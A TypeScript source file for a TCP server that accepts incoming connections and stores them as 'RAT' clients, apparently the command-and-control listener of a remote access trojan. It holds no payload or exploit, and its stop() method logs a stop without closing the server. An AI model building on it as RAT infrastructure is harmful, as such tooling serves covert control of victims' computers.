import {createServer, Server, Socket} from 'net';
import CustomClient from './CustomClient';
import ITCPServer from "../interfaces/IRATServer";
import RATClient from './RATClient';


export default class TCPServer implements ITCPServer {
    client: CustomClient;
    host: string;
    port: number;
    ratClients: RATClient[];
    server: Server;
    started: boolean = false;
    
    constructor(client: CustomClient) {
        this.client = client;
        this.ratClients = new Array<RATClient>();
        this.host = client.config.tcpHost;
        this.port = client.config.tcpPort;
        this.server = createServer();
    }
    
    start(): void {
        this.server.listen(this.port, this.host, () => {
            this.started = true;
            console.log(`RAT TCP server started on ${this.host}:${this.port}`);
        });
        this.server.on('connection', async (socket: Socket) => {
            // create client object and adds it to the clients array
            let client = new RATClient(socket);
            this.ratClients.push(client);
        });
    }
    
    stop(): void {
        console.log(`Server stopped on ${this.host}:${this.port}`);
    }

    isListening(): boolean {
        return this.started;
    }
}